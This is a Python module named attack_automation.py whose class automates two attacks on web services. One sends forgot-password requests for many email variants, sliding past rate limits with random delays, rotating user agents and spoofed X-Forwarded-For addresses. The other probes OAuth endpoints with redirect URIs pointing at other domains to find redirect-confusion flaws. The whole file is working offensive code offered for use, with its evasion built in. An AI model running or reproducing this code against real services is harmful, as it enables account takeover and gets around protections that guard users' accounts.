# modules/attack_automation.py
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import time
import random

class AttackAutomation:
    def __init__(self):
        self.session = None
        self.results = []
        
    async def forgot_password_attack(self, target_url, email_variants):
        """Automated forgot password attack"""
        successful_attacks = []
        
        async with aiohttp.ClientSession() as session:
            for variant in email_variants:
                try:
                    # Rate limiting evasion
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                    
                    # Forgot password request
                    data = {
                        'email': variant['email'],
                        'action': 'forgot_password'
                    }
                    
                    # Use different user agents
                    headers = {
                        'User-Agent': self.get_random_user_agent(),
                        'X-Forwarded-For': self.get_random_ip(),
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                    
                    async with session.post(
                        target_url + '/forgot-password',
                        data=data,
                        headers=headers,
                        timeout=10
                    ) as response:
                        
                        response_text = await response.text()
                        
                        # Success indicators
                        success_indicators = [
                            'reset link sent',
                            'check your email',
                            'password reset',
                            'email sent'
                        ]
                        
                        if any(indicator in response_text.lower() 
                               for indicator in success_indicators):
                            successful_attacks.append({
                                'email_variant': variant,
                                'response_code': response.status,
                                'response_snippet': response_text[:200]
                            })
                            
                except Exception as e:
                    print(f"Attack error for {variant['email']}: {e}")
                    
        return successful_attacks
    
    async def oauth_flow_attack(self, oauth_endpoints, domain_variants):
        """OAuth provider confusion attack"""
        successful_oauth = []
        
        for endpoint in oauth_endpoints:
            for domain_variant in domain_variants:
                try:
                    # OAuth redirect manipulation
                    oauth_params = {
                        'client_id': 'test_client',
                        'redirect_uri': f"https://{domain_variant}/callback",
                        'response_type': 'code',
                        'scope': 'email profile'
                    }
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.get(
                            endpoint,
                            params=oauth_params,
                            allow_redirects=False
                        ) as response:
                            
                            if response.status in [302, 301]:
                                successful_oauth.append({
                                    'endpoint': endpoint,
                                    'domain_variant': domain_variant,
                                    'redirect_location': response.headers.get('Location')
                                })
                                
                except Exception as e:
                    continue
                    
        return successful_oauth
    
    def get_random_user_agent(self):
        """Return random user agent for evasion"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        return random.choice(user_agents)
    
    def get_random_ip(self):
        """Generate random IP for X-Forwarded-For header"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
